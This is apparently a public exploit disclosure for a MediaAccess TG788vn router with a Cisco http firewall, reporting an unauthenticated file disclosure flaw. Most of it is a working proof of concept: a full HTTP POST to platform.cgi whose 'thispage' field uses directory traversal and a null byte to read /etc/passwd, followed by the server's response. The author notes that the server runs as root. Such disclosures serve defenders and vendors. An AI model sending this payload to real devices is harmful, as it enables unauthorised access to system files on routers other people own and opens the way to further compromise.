Vulnerable hardware : MediaAccess TG788vn with Cisco http firewall
Author : Ahmed Sultan (0x4148)
Email : 0x4148@gmail.com

MediaAccess TG788vn with Cisco firewall http config is vulnerable to
critical unauthenticated file disclosure flaw,

POC

Request:
POST /scgi-bin/platform.cgi HTTP/1.1
Host: xx.xx.xx.xx
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://xx.xx.xx.xx/scgi-bin/platform.cgi
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 164

button.login.home=Se%20connecter&Login.userAgent=0x4148_Fu&reload=0&SSLVPNUser.Password=0x4148Fu&SSLVPNUser.UserName=0x4148&thispage=../../../../../../etc/passwd%00

Response:
HTTP/1.0 200 OK
Date: Sat, 01 Jan 2011 00:00:45 GMT
Server: Embedded HTTP Server.
Connection: close

loic_ipsec:x:500:500:xauth:/:/bin/cli

the http server is running with root privileges , which mean that the
attacker might escalate the exploit for further critical attacks